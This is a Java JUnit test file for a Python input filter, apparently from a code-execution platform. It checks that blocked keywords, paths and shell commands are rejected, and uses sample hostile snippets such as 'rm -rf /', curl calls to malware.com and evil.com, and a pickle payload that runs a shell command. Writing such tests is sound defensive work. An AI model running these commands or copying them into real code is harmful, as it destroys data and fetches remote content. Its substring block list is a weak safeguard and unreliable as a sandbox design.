package devdojo.compiler.python.security;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import devdojo.compiler.security.ISecurityFilter;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

final class PythonInputFilterTests {

  private ISecurityFilter filter;

  @BeforeEach
  void setUp() {
    filter = new PythonInputFilter();
  }

  @Test
  @DisplayName("returns false when input is null")
  void testNullInput() {
    boolean result = filter.check(null);
    assertFalse(result, "Null input should be rejected");
  }

  @Test
  @DisplayName("returns false when input is empty or blank")
  void testEmptyInput() {
    boolean result = filter.check("   ");
    assertFalse(result, "Blank input should be rejected");
  }

  @Test
  @DisplayName("returns true for safe Python code")
  void testValidPythonCode() {
    String safeCode = """
      def greet(name):
          print(f"Hello, {name}!")
      greet("world")
      """;

    assertTrue(filter.check(safeCode), "Safe Python code should pass");
  }

  @ParameterizedTest
  @ValueSource(strings = {
    "eval(", "exec(", "compile(", "open(", "input(", "__import__(", "__builtins__",
    "getattr(", "setattr(", "delattr(", "locals(", "globals(", "vars(", "dir(",
    "os", "sys", "subprocess", "socket", "shutil", "signal", "resource",
    "importlib", "marshal", "pickle", "popen", "system(", "run(", "call(",
    "requests", "urllib", "ftplib", "telnetlib", "while True", "for(;;)"
  })
  @DisplayName("detects forbidden Python keywords and builtins")
  void testForbiddenPythonKeyword(final String keyword) {
    assertFalse(filter.check(keyword), "Forbidden Python keyword or builtin should be blocked: " + keyword);
  }

  @ParameterizedTest
  @ValueSource(strings = {
    ".py", ".pyc", ".exe", ".dll", ".bat", ".sh", ".zip",
    "/etc", "/home", "C:\\", "C:\\Windows\\System32", "%APPDATA%"
  })
  @DisplayName("detect forbidden file endings and paths")
  void testForbiddenFileEnding(final String fileEnding) {
    assertFalse(filter.check(fileEnding), "Forbidden file endings or paths should be blocked: " + fileEnding);
  }

  @ParameterizedTest
  @ValueSource(strings = {
    "rm -rf", "curl", "wget", "chmod", "chown", "../", "./",
    "bash -c", "python -c", "os.system", "subprocess.call", "subprocess.run",
    "\\", "\\u006f\\u0073"
  })
  @DisplayName("detects forbidden commands or code injection attempts")
  void testForbiddenCommand(final String command) {
    assertFalse(filter.check(command), "Forbidden or dangerous command should be rejected: " + command);
  }

  @Test
  @DisplayName("detects forbidden function code")
  void testForbiddenFunctionCode() {
    final String dangerousCode1 = """
      import os
      os.system('rm -rf /')
      """;

    final String dangerousCode2 = """
      import subprocess
      subprocess.run(['curl', 'http://malware.com'])
      """;

    final String dangerousCode3 = """
      code = "print('hacked')"
      eval(code)
      """;

    final String dangerousCode4 = """
      import pickle
      pickle.loads(b"cos\nsystem\n(S'echo injected'\ntR.")
      """;

    assertFalse(filter.check(dangerousCode1), "os.system should be blocked");
    assertFalse(filter.check(dangerousCode2), "subprocess.run should be blocked");
    assertFalse(filter.check(dangerousCode3), "eval() should be blocked");
    assertFalse(filter.check(dangerousCode4), "pickle.loads should be blocked");
  }

  @Test
  @DisplayName("detects multiple forbidden inputs")
  void testMultipleForbiddenInputs() {
    final String code = """
        import os
        import subprocess
        os.system('curl evil.com')
        subprocess.run(['rm', '-rf', '/'])
      """;

    assertFalse(filter.check(code), "Multiple forbidden patterns should fail");
  }
}
